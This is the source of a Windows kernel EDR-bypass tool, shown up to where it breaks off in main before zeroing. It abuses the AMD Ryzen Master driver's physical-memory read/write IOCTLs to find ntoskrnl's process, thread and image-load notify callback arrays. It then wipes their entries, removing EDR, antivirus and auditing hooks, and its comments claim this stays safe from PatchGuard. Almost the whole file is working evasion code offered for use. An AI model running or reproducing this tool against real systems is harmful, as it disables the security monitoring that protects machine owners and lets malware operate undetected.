/*
 * notify_callbacks_bypass.c â€” Remove EDR entries from kernel Ps* notify arrays
 *
 * Windows kernel maintains three arrays of callback pointers consulted on
 * every process creation, image load, and thread creation system-wide:
 *
 *   PspCreateProcessNotifyRoutine  (max 64 entries)
 *     â† PsSetCreateProcessNotifyRoutine / PsSetCreateProcessNotifyRoutineEx
 *     EDR use: monitor process birth/death, block malicious process creation
 *              (CreateInfo->CreationStatus = STATUS_ACCESS_DENIED)
 *
 *   PspLoadImageNotifyRoutine      (max 8 entries)
 *     â† PsSetLoadImageNotifyRoutine
 *     EDR use: DLL injection detection, driver load auditing
 *
 *   PspCreateThreadNotifyRoutine   (max 64 entries)
 *     â† PsSetCreateThreadNotifyRoutine
 *     EDR use: remote thread detection (CreateRemoteThread â†’ suspicious PID)
 *
 * These arrays are NOT exported. We find them by scanning the body of the
 * corresponding exported PsSet* function for RIP-relative LEA instructions:
 *
 *   REX.W + LEA Rx, [RIP + disp32]    (48/4C 8D [25|2D|35|3D] xx xx xx xx)
 *
 * The first such instruction referencing ntoskrnl's data section loads the
 * array address. All targets are collected; the one that reads as a mix of
 * null slots and aligned kernel-VA-looking entries is the array.
 *
 * Each array entry is an EX_CALLBACK value:
 *   NULL              = empty slot
 *   non-null          = low bits are RefCount flags, (value & ~0xF) is the
 *                       physical kernel-VA of an EX_CALLBACK_ROUTINE_BLOCK:
 *                           +0x00  EX_RUNDOWN_REF RunRef
 *                           +0x08  PVOID Function  â† the actual callback fn
 *                           +0x10  PVOID Context
 *
 * We zero non-null array entries directly (they are in ntoskrnl .data, so
 * we can compute their PA from ntoskrnl_PA + RVA). This severs the callback
 * without needing to translate pool VAs or touch code sections.
 *
 * No PatchGuard risk: we only modify ntoskrnl's .data section (callback
 * arrays), not code pages. PatchGuard does not protect data.
 *
 * Build:
 *   x86_64-w64-mingw32-gcc -O2 -Wall -o notify_callbacks_bypass.exe \
 *       notify_callbacks_bypass.c -lkernel32 -ladvapi32
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* â”€â”€ Driver â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
#define DEVICE_NAME      L"\\\\.\\AMDRyzenMasterDriverV20"
#define IOCTL_PHYS_READ  0x81112F08u
#define IOCTL_PHYS_WRITE 0x81112F0Cu
static HANDLE g_dev = INVALID_HANDLE_VALUE;

/* â”€â”€ Physical ranges â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
#define MAX_RANGES 64
typedef struct { uint64_t base, size; } PhysRange;
static PhysRange g_ranges[MAX_RANGES];
static int       g_nranges = 0;

static void load_ranges(void)
{
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
            "HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
            0, KEY_READ, &hKey) != ERROR_SUCCESS) return;
    char vname[256]; DWORD vn, vd, type;
    uint8_t *buf = NULL; DWORD sz = 0;
    for (DWORD i = 0; ; i++) {
        vn = sizeof vname; vd = 0;
        if (RegEnumValueA(hKey,i,vname,&vn,NULL,&type,NULL,&vd) == ERROR_NO_MORE_ITEMS) break;
        if ((type!=3&&type!=8)||vd<20) continue;
        buf = (uint8_t*)malloc(vd);
        if (!buf) continue;
        if (RegQueryValueExA(hKey,vname,NULL,NULL,buf,&vd)==ERROR_SUCCESS){sz=vd;break;}
        free(buf); buf=NULL;
    }
    RegCloseKey(hKey);
    if (!buf||sz<20){free(buf);return;}
    DWORD cnt=*(DWORD*)(buf+16); uint8_t *p=buf+20;
    for (DWORD i=0;i<cnt&&g_nranges<MAX_RANGES;i++,p+=20){
        if(p+20>buf+sz||p[0]!=3) continue;
        g_ranges[g_nranges].base=*(uint64_t*)(p+4);
        g_ranges[g_nranges].size=*(uint64_t*)(p+12);
        g_nranges++;
    }
    free(buf);
}

static int pa_in_range(uint64_t pa, uint32_t sz)
{
    for(int i=0;i<g_nranges;i++)
        if(pa>=g_ranges[i].base&&pa+sz<=g_ranges[i].base+g_ranges[i].size) return 1;
    return 0;
}

/* â”€â”€ Physical I/O â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
static int phys_read(uint64_t pa, void *buf, uint32_t sz)
{
    struct { uint64_t pa; uint32_t sz; } in = {pa,sz};
    uint32_t out_sz=12+sz;
    uint8_t *out=(uint8_t*)calloc(1,out_sz); if(!out) return 0;
    DWORD got=0;
    BOOL ok=DeviceIoControl(g_dev,IOCTL_PHYS_READ,&in,sizeof(in),out,out_sz,&got,NULL);
    if(ok&&got>=12) memcpy(buf,out+12,sz);
    free(out); return ok&&got>=12;
}

static int phys_write(uint64_t pa, const void *data, uint32_t sz)
{
    if(!pa_in_range(pa,sz)) return 0;
    uint32_t in_sz=12+sz;
    uint8_t *in_buf=(uint8_t*)malloc(in_sz); if(!in_buf) return 0;
    *(uint64_t*)in_buf=pa; *(uint32_t*)(in_buf+8)=sz;
    memcpy(in_buf+12,data,sz);
    DWORD got=0;
    BOOL ok=DeviceIoControl(g_dev,IOCTL_PHYS_WRITE,in_buf,in_sz,NULL,0,&got,NULL);
    free(in_buf); return ok;
}

/* â”€â”€ Module list â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
typedef NTSTATUS (NTAPI *PFN_NTQSI)(ULONG,PVOID,ULONG,PULONG);
typedef struct {
    HANDLE Section; PVOID MappedBase,ImageBase;
    ULONG  ImageSize,Flags;
    USHORT LoadOrderIndex,InitOrderIndex,LoadCount,OffsetToFileName;
    CHAR   FullPathName[256];
} MOD_ENTRY;
typedef struct { ULONG NumberOfModules; MOD_ENTRY Modules[1]; } MOD_LIST;

static MOD_LIST *get_module_list(void)
{
    PFN_NTQSI fn=(PFN_NTQSI)GetProcAddress(GetModuleHandleA("ntdll.dll"),"NtQuerySystemInformation");
    if(!fn) return NULL;
    ULONG sz=0x80000; MOD_LIST *ml=NULL; NTSTATUS st;
    do{free(ml);ml=(MOD_LIST*)malloc(sz*=2);st=fn(11,ml,sz,NULL);}
    while(st==(NTSTATUS)0xC0000004L);
    if(st){free(ml);return NULL;} return ml;
}

static uint64_t get_ntoskrnl_va(char *path_out, uint32_t *img_size)
{
    MOD_LIST *ml=get_module_list(); if(!ml) return 0;
    uint64_t va=(uint64_t)ml->Modules[0].ImageBase;
    if(img_size) *img_size=ml->Modules[0].ImageSize;
    if(path_out){
        /* Use actual filename from module list (handles ntkrnlmp.exe etc.) */
        const char *fname = ml->Modules[0].FullPathName
                          + ml->Modules[0].OffsetToFileName;
        char sysdir[MAX_PATH];
        GetSystemDirectoryA(sysdir, sizeof sysdir);
        snprintf(path_out, MAX_PATH, "%s\\%s", sysdir, fname);
        if(GetFileAttributesA(path_out)==INVALID_FILE_ATTRIBUTES)
            snprintf(path_out, MAX_PATH, "%s\\ntoskrnl.exe", sysdir);
    }
    free(ml); return va;
}

/* Driver module map for callback identification */
#define MAX_MODS 256
typedef struct { uint64_t base,size; char name[64]; } KMod;
static KMod g_mods[MAX_MODS];
static int  g_nmods = 0;

static void load_module_map(void)
{
    MOD_LIST *ml=get_module_list(); if(!ml) return;
    for(ULONG i=0;i<ml->NumberOfModules&&g_nmods<MAX_MODS;i++){
        g_mods[g_nmods].base=(uint64_t)ml->Modules[i].ImageBase;
        g_mods[g_nmods].size=ml->Modules[i].ImageSize;
        const char *fn=ml->Modules[i].FullPathName+ml->Modules[i].OffsetToFileName;
        strncpy(g_mods[g_nmods].name,fn,63); g_mods[g_nmods].name[63]='\0';
        g_nmods++;
    }
    free(ml);
}

/* Returns short driver name if va is in any loaded module's range. */
static const char *va_to_module(uint64_t va)
{
    for(int i=0;i<g_nmods;i++)
        if(va>=g_mods[i].base&&va<g_mods[i].base+g_mods[i].size)
            return g_mods[i].name;
    return NULL;
}

/* â”€â”€ PE export RVA lookup â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
static uint32_t pe_export_rva(const uint8_t *pe, size_t fsz, const char *sym)
{
    if(fsz<0x100||pe[0]!='M'||pe[1]!='Z') return 0;
    int32_t elf=*(int32_t*)(pe+0x3C);
    if(elf<=0||(uint32_t)elf+0x90>fsz) return 0;
    uint16_t ns=*(uint16_t*)(pe+elf+6),osz=*(uint16_t*)(pe+elf+20);
    uint32_t sb=(uint32_t)elf+24+osz;

    #define R2F(rva,fo) do{(fo)=0;\
        for(uint16_t _i=0;_i<ns;_i++){\
            uint32_t _s=sb+_i*40,_va=*(uint32_t*)(pe+_s+12);\
            uint32_t _vsz=*(uint32_t*)(pe+_s+16);if(!_vsz)_vsz=*(uint32_t*)(pe+_s+24);\
            uint32_t _fo=*(uint32_t*)(pe+_s+20);\
            if((rva)>=_va&&(rva)<_va+_vsz){(fo)=_fo+((rva)-_va);break;}}\
    }while(0)

    uint32_t erva=*(uint32_t*)(pe+elf+0x88),efo=0; R2F(erva,efo);
    if(!efo||efo+40>fsz) return 0;
    const uint8_t *exp=pe+efo;
    uint32_t nn=*(uint32_t*)(exp+0x18);
    uint32_t rfn=*(uint32_t*)(exp+0x1C),rnm=*(uint32_t*)(exp+0x20),rod=*(uint32_t*)(exp+0x24);
    uint32_t ffn=0,fnm=0,fod=0; R2F(rfn,ffn); R2F(rnm,fnm); R2F(rod,fod);
    if(!ffn||!fnm||!fod) return 0;
    for(uint32_t i=0;i<nn;i++){
        uint32_t nrva=*(uint32_t*)(pe+fnm+i*4),nfo=0; R2F(nrva,nfo);
        if(!nfo||nfo>=fsz) continue;
        if(strcmp((char*)(pe+nfo),sym)==0){
            uint16_t ord=*(uint16_t*)(pe+fod+i*2);
            return *(uint32_t*)(pe+ffn+ord*4);
        }
    }
    #undef R2F
    return 0;
}

/* â”€â”€ PE: check if an RVA is in a writable data section (not .text) â”€â”€â”€â”€â”€ */
/*
 * EX_CALLBACK arrays live in ntoskrnl's .data section (writable, no code).
 * LEA targets pointing into .text or .rdata are wrong â€” reject them.
 */
static int rva_in_data_section(const uint8_t *pe, size_t pe_sz, uint32_t rva)
{
    if (pe_sz < 0x40 || pe[0] != 'M' || pe[1] != 'Z') return 0;
    uint32_t pe_off = *(uint32_t*)(pe + 0x3C);
    if (pe_off + 24 > pe_sz) return 0;
    uint16_t n_sec  = *(uint16_t*)(pe + pe_off + 6);
    uint16_t opt_sz = *(uint16_t*)(pe + pe_off + 20);
    uint32_t stab   = pe_off + 24 + opt_sz;

    for (int i = 0; i < n_sec; i++) {
        uint32_t s = stab + i * 40;
        if (s + 40 > pe_sz) break;
        uint32_t va  = *(uint32_t*)(pe + s + 12);
        uint32_t vsz = *(uint32_t*)(pe + s + 16);
        uint32_t chr = *(uint32_t*)(pe + s + 36);
        if (rva < va || rva >= va + vsz) continue;

        /* IMAGE_SCN_CNT_CODE=0x20, IMAGE_SCN_MEM_EXECUTE=0x20000000
         * IMAGE_SCN_CNT_INITIALIZED_DATA=0x40, IMAGE_SCN_MEM_WRITE=0x80000000 */
        int is_code  = (chr & 0x20) || (chr & 0x20000000U);
        int is_wdata = (chr & 0x40)  && (chr & 0x80000000U);
        return is_wdata && !is_code;
    }
    return 0;
}

/* â”€â”€ Find ntoskrnl PA via 2MB NtBuildNumber scan â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
#define CHUNK 0x10000

static uint64_t find_ntoskrnl_pa(const char *path)
{
    HANDLE hf=CreateFileA(path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if(hf==INVALID_HANDLE_VALUE) return 0;
    DWORD fsz=GetFileSize(hf,NULL);
    uint8_t *pe=(uint8_t*)malloc(fsz); DWORD rd=0;
    ReadFile(hf,pe,fsz,&rd,NULL); CloseHandle(hf);
    uint32_t rva=pe_export_rva(pe,fsz,"NtBuildNumber");
    free(pe); if(!rva) return 0;

    uint32_t ssd=*(uint32_t*)(0x7FFE0000+0x260)&0xFFFF;
    uint32_t c0=ssd,c1=ssd|0xF0000000,c2=ssd|0xC0000000;
    const uint64_t STEP=0x200000ULL;
    for(int ri=0;ri<g_nranges;ri++){
        uint64_t base=(g_ranges[ri].base+STEP-1)&~(STEP-1);
        uint64_t end=g_ranges[ri].base+g_ranges[ri].size;
        for(uint64_t pa=base;pa<end;pa+=STEP){
            if(!pa_in_range(pa+rva,4)) continue;
            uint32_t val=0; phys_read(pa+rva,&val,4);
            if(val!=c0&&val!=c1&&val!=c2) continue;
            uint16_t mz=0; phys_read(pa,&mz,2);
            if(mz==0x5A4D) return pa;
        }
    }
    return 0;
}

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 * Notify array finder
 *
 * Scans the first 256 bytes of an exported PsSet* function looking for
 * RIP-relative LEA instructions:
 *
 *   [REX]  LEA  Rx, [RIP + disp32]
 *   48/4C  8D   [25|2D|35|3D]  xx xx xx xx
 *
 * Collects all targets in ntoskrnl's VA range.  For each candidate, we
 * read 64 QWORDs and score it: null slots score 1, aligned kernel-VA
 * values score 2.  The highest-scoring candidate is the array.
 * â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
static uint64_t find_array_va(const uint8_t *pe, size_t pe_sz,
                               uint64_t nt_pa, uint64_t nt_va,
                               const char *setter_name)
{
    uint32_t func_rva = pe_export_rva(pe, pe_sz, setter_name);
    if (!func_rva) {
        printf("    [!] %s not exported\n", setter_name);
        return 0;
    }
    printf("    %s  RVA=0x%X\n", setter_name, func_rva);

    /* Read 512 bytes of function body (some builds have LEA beyond 256 bytes) */
    uint8_t code[512] = {0};
    phys_read(nt_pa + func_rva, code, sizeof code);

    uint64_t candidates[16];
    int      ncand = 0;

    for (int i = 0; i < (int)sizeof(code) - 7 && ncand < 16; i++) {  /* 512-7=505 max */
        uint8_t rex   = code[i];
        uint8_t opc   = code[i+1];
        uint8_t modrm = code[i+2];

        /* REX.W or REX.WR prefix (0x48, 0x4C) + LEA (0x8D) */
        if (rex != 0x48 && rex != 0x4C) continue;
        if (opc != 0x8D) continue;
        /* ModRM: mod=00 (no base), rm=101 â†’ RIP-relative on x64 */
        if ((modrm & 0xC7) != 0x05) continue;

        int32_t  disp    = *(int32_t*)(code + i + 3);
        uint64_t rip_va  = nt_va + func_rva + i + 7;
        uint64_t tgt_va  = (uint64_t)((int64_t)rip_va + disp);

        /* Must be within ntoskrnl image AND in a writable data section (not .text) */
        if (tgt_va < nt_va || tgt_va >= nt_va + pe_sz) continue;
        uint32_t tgt_rva = (uint32_t)(tgt_va - nt_va);
        if (!rva_in_data_section(pe, pe_sz, tgt_rva)) continue;

        /* Dedup */
        int dup = 0;
        for (int j = 0; j < ncand; j++) if (candidates[j] == tgt_va) { dup=1; break; }
        if (!dup) candidates[ncand++] = tgt_va;
    }

    printf("    RIP-relative LEA â†’ writable data section targets: %d\n", ncand);

    /*
     * Score each candidate by reading max_entries QWORDs.
     *
     * STRICT RULE: real EX_CALLBACK arrays contain only:
     *   NULL (0x0000000000000000)  â€” empty slot
     *   kernel VA + low flags      â€” top 16 bits must be 0xFFFF
     *
     * If ANY non-null slot has top 16 bits != 0xFFFF it is NOT the callback
     * array (it is code bytes, rodata, or some other structure).
     */
    uint64_t best_va = 0; int best_score = -1;
    for (int c = 0; c < ncand; c++) {
        uint64_t tgt_va = candidates[c];
        uint64_t tgt_pa = nt_pa + (tgt_va - nt_va);
        uint64_t entries[64] = {0};
        if (!phys_read(tgt_pa, entries, 64*8)) continue;

        int valid = 1, n_null = 0, n_ptr = 0;
        for (int j = 0; j < 64; j++) {
            uint64_t v = entries[j];
            if (v == 0) { n_null++; continue; }
            /* Top 16 bits MUST be 0xFFFF for a Windows kernel VA */
            if ((v >> 48) != 0xFFFFULL) { valid = 0; break; }
            n_ptr++;
        }

        if (!valid) {
            printf("    Candidate VA=0x%016llX  REJECTED (non-null slot is not kernel VA)\n",
                   (unsigned long long)tgt_va);
            continue;
        }

        /* Score: prefer mixes of nulls+ptrs over all-null (code sections full of zeros) */
        int score = n_null + n_ptr * 10;
        printf("    Candidate VA=0x%016llX  score=%d  (null=%d ptr=%d)\n",
               (unsigned long long)tgt_va, score, n_null, n_ptr);

        if (score > best_score && (n_ptr > 0 || n_null > 0)) {
            best_score = score; best_va = tgt_va;
        }
    }

    /* Safety: require at least MIN_VOTES=3 entries look like the real array */
    if (best_va && best_score < 3) {
        printf("    â†’ Score too low (%d) â€” not confident enough\n\n", best_score);
        return 0;
    }

    if (best_va)
        printf("    â†’ Array VA=0x%016llX  (score=%d)\n\n",
               (unsigned long long)best_va, best_score);
    else
        printf("    â†’ Array not found in data sections\n\n");

    return best_va;
}

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
 * Notify array entry management
 * â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
#define MAX_ENTRIES 64

typedef struct {
    uint64_t entry_pa;   /* PA of the array slot */
    uint64_t orig_val;   /* original EX_CALLBACK value (with low-bit flags) */
    int      zeroed;
} SavedEntry;

typedef struct {
    const char  *name;          /* human name (e.g. "PspCreateProcessNotifyRoutine") */
    const char  *setter;        /* exported PsSet* function used to locate array */
    int          max_entries;   /* 64 for process/thread, 8 for image */
    uint64_t     array_va;      /* kernel VA of array (0 if not found) */
    uint64_t     array_pa;      /* physical address of array */
    SavedEntry   entries[MAX_ENTRIES];
    int          n_saved;
} NotifyArray;

static NotifyArray g_arrays[] = {
    { "PspCreateProcessNotifyRoutine", "PsSetCreateProcessNotifyRoutine",  64, 0,0,{},0 },
    { "PspLoadImageNotifyRoutine",     "PsSetLoadImageNotifyRoutine",       8, 0,0,{},0 },
    { "PspCreateThreadNotifyRoutine",  "PsSetCreateThreadNotifyRoutine",   64, 0,0,{},0 },
};
#define N_ARRAYS ((int)(sizeof(g_arrays)/sizeof(g_arrays[0])))

static volatile int g_zeroed_any = 0;

/* Cache eviction */
#define EVICT_SIZE (256*1024*1024)
static void cache_evict_once(void)
{
    volatile uint8_t *p=(volatile uint8_t*)
        VirtualAlloc(NULL,EVICT_SIZE,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    if(!p){Sleep(100);return;}
    for(size_t i=0;i<EVICT_SIZE;i+=64) p[i]=(uint8_t)(i>>6);
    volatile uint64_t s=0;
    for(size_t i=EVICT_SIZE;i>=64;i-=64) s^=p[i-64];
    (void)s;
    VirtualFree((LPVOID)p,0,MEM_RELEASE); Sleep(10);
}
static void cache_evict_multiccd(void)
{
    SYSTEM_INFO si; GetSystemInfo(&si); DWORD ncpu=si.dwNumberOfProcessors;
    HANDLE thr=GetCurrentThread();
    DWORD_PTR orig=SetThreadAffinityMask(thr,1);
    SetThreadAffinityMask(thr,1ULL); Sleep(1); cache_evict_once();
    if(ncpu>1){SetThreadAffinityMask(thr,(DWORD_PTR)1<<(ncpu-1));Sleep(1);cache_evict_once();}
    SetThreadAffinityMask(thr,orig);
}

/* â”€â”€ Zero one notify array â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
static void zero_array(NotifyArray *arr)
{
    arr->n_saved = 0;
    int zeroed = 0, skipped = 0;
    uint64_t z8 = 0;

    for (int i = 0; i < arr->max_entries; i++) {
        uint64_t entry_pa = arr->array_pa + (uint64_t)i * 8;
        uint64_t val = 0;
        if (!phys_read(entry_pa, &val, 8)) continue;
        if (val == 0) continue;

        /* (val & ~0xF) is the EX_CALLBACK_ROUTINE_BLOCK VA (pool pointer).
         * Print the routine block VA and try to identify the driver. */
        uint64_t block_va = val & ~(uint64_t)0xF;
        const char *drv = va_to_module(block_va);  /* usually NULL - pool addr */

        printf("    [%2d] val=0x%016llX  block_VA=0x%016llX  %s\n",
               i, (unsigned long long)val, (unsigned long long)block_va,
               drv ? drv : "(pool â€” driver unknown without CR3)");

        if (arr->n_saved < MAX_ENTRIES) {
            arr->entries[arr->n_saved].entry_pa = entry_pa;
            arr->entries[arr->n_saved].orig_val = val;
            arr->entries[arr->n_saved].zeroed   = 0;
            if (phys_write(entry_pa, &z8, 8)) {
                arr->entries[arr->n_saved].zeroed = 1;
                zeroed++;
            } else {
                printf("         [!] write FAILED\n");
                skipped++;
            }
            arr->n_saved++;
        }
    }
    printf("    Zeroed: %d  |  Failed: %d\n", zeroed, skipped);
    if (zeroed > 0) g_zeroed_any = 1;
}

/* â”€â”€ Restore one notify array â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
static void restore_array(NotifyArray *arr)
{
    for (int i = 0; i < arr->n_saved; i++) {
        SavedEntry *se = &arr->entries[i];
        if (!se->zeroed) continue;
        /* Only restore if still zeroed */
        uint64_t cur = 0;
        if (phys_read(se->entry_pa, &cur, 8) && cur == 0)
            phys_write(se->entry_pa, &se->orig_val, 8);
    }
}

static void do_restore_all(void)
{
    if (!g_zeroed_any) return;
    printf("\n[R] Restoring notify arrays...\n");
    for (int i = 0; i < N_ARRAYS; i++)
        restore_array(&g_arrays[i]);
    cache_evict_multiccd();
    g_zeroed_any = 0;
    printf("[R] Done.\n\n");
}

static BOOL WINAPI ctrl_handler(DWORD ev)
{
    if(ev==CTRL_C_EVENT||ev==CTRL_BREAK_EVENT||
       ev==CTRL_CLOSE_EVENT||ev==CTRL_LOGOFF_EVENT||ev==CTRL_SHUTDOWN_EVENT){
        if(g_zeroed_any){
            printf("\n[!] %s â€” emergency restore...\n",
                   ev==CTRL_C_EVENT?"Ctrl+C":"shutdown");
            fflush(stdout);
            do_restore_all();
            fflush(stdout);
        }
        return FALSE;
    }
    return FALSE;
}

static void enable_debug_privilege(void)
{
    HANDLE hTok; TOKEN_PRIVILEGES tp={1};
    if(!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hTok)) return;
    LookupPrivilegeValueA(NULL,"SeDebugPrivilege",&tp.Privileges[0].Luid);
    tp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
    BOOL ok=AdjustTokenPrivileges(hTok,FALSE,&tp,0,NULL,NULL);
    printf("[*] SeDebugPrivilege: %s\n",(ok&&GetLastError()==0)?"enabled":"FAILED");
    CloseHandle(hTok);
}

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
int main(void)
{
    SetConsoleOutputCP(CP_UTF8);
    printf("=== Kernel Notify Routines Bypass ===\n\n");
    printf("  Targets:\n");
    printf("    PspCreateProcessNotifyRoutine  (max 64, process birth/death)\n");
    printf("    PspLoadImageNotifyRoutine      (max  8, DLL/driver load)\n");
    printf("    PspCreateThreadNotifyRoutine   (max 64, thread creation)\n\n");
    printf("  PatchGuard note: modifies ntoskrnl .data (arrays), NOT .text.\n");
    printf("  Data sections are not protected by PatchGuard â€” safe.\n\n");

    g_dev=CreateFileW(DEVICE_NAME,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
    if(g_dev==INVALID_HANDLE_VALUE){printf("[-] Cannot open device: %lu\n",GetLastError());return 1;}
    printf("[+] Device opened\n");
    enable_debug_privilege();
    printf("\n");

    load_ranges();
    printf("[1] Physical ranges: %d\n",g_nranges);
    if(!g_nranges){printf("[-] No ranges\n");CloseHandle(g_dev);return 1;}
    for(int i=0;i<g_nranges;i++)
        printf("    [%d] 0x%016llX  %llu MB\n",i,
               (unsigned long long)g_ranges[i].base,
               (unsigned long long)(g_ranges[i].size>>20));
    printf("\n");

    /* Module map for callback identification (best-effort) */
    load_module_map();

    /* â”€â”€ ntoskrnl VA + path â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
    char nt_path[MAX_PATH]={0}; uint32_t nt_img_size=0;
    uint64_t nt_va=get_ntoskrnl_va(nt_path,&nt_img_size);
    printf("[2] ntoskrnl VA=0x%016llX  size=0x%X\n    Path=%s\n\n",
           (unsigned long long)nt_va,nt_img_size,nt_path);

    /* â”€â”€ Read ntoskrnl from disk â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
    HANDLE hf=CreateFileA(nt_path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if(hf==INVALID_HANDLE_VALUE){printf("[-] Cannot open ntoskrnl.exe\n");CloseHandle(g_dev);return 1;}
    DWORD pe_sz=GetFileSize(hf,NULL);
    uint8_t *pe_buf=(uint8_t*)malloc(pe_sz);
    DWORD rd=0; ReadFile(hf,pe_buf,pe_sz,&rd,NULL); CloseHandle(hf);

    /* â”€â”€ Find ntoskrnl PA â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
    printf("[3] Finding ntoskrnl PA...\n");
    uint64_t nt_pa=find_ntoskrnl_pa(nt_path);
    if(!nt_pa){printf("[-] Not found\n");free(pe_buf);CloseHandle(g_dev);return 1;}
    printf("    PA=0x%016llX\n\n",(unsigned long long)nt_pa);

    /* â”€â”€ Locate each notify array â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
    printf("[4] Locating notify arrays via RIP-relative LEA scan...\n\n");
    int found_any = 0;
    for (int i = 0; i < N_ARRAYS; i++) {
        printf("  %s:\n", g_arrays[i].name);
        g_arrays[i].array_va = find_array_va(pe_buf, pe_sz, nt_pa, nt_va,
                                              g_arrays[i].setter);
        if (g_arrays[i].array_va) {
            g_arrays[i].array_pa = nt_pa + (g_arrays[i].array_va - nt_va);
            printf("    PA=0x%016llX\n\n",(unsigned long long)g_arrays[i].array_pa);
            found_any = 1;
        }
    }
    free(pe_buf);

    if (!found_any) {
        printf("[-] No notify arrays found. Possible causes:\n");
        printf("    - Export names changed in this kernel build\n");
        printf("    - RIP-relative LEA not found in first 256 bytes of setter\n");
        CloseHandle(g_dev); return 1;
    }

    /* â”€â”€ Confirm before zeroing â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
    printf("=============================================================\n");
    printf("  About to zero all non-null entries in found arrays.\n");
    printf("  Process/thread/image load callbacks from ALL drivers\n");
    printf("  (EDR, AV, auditing, ELAM, etc.) will be removed.\n");
